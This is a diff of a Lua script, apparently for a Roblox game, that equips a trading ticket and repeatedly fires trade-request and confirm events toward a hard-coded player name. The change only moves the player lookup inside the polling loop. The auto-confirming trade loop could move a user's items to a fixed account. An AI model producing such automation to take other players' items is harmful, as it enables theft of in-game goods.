@@ -9,7 +9,7 @@ local Confirm = ReplicatedStorage.GameEvents.TradeEvents.Confirm
 local SendRequest = ReplicatedStorage.GameEvents.TradeEvents.SendRequest -- RemoteEvent 
 local TradingUI = game:GetService("Players").LocalPlayer.PlayerGui.TradingUI
 local playerNameToCheck = "ThanhTuoi_IsFake"
-local playerFound = game.Players:FindFirstChild(playerNameToCheck)
+
 function equipticket()
 	for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
 		if string.find(string.lower(tool.Name), string.lower("Trading Ticket")) then
@@ -44,6 +44,7 @@ while wait(2) do
 			Confirm:FireServer()
 		end
 	else
+		local playerFound = game.Players:FindFirstChild(playerNameToCheck)
 		if playerFound then
 			equipticket()
 			SendRequest:FireServer(
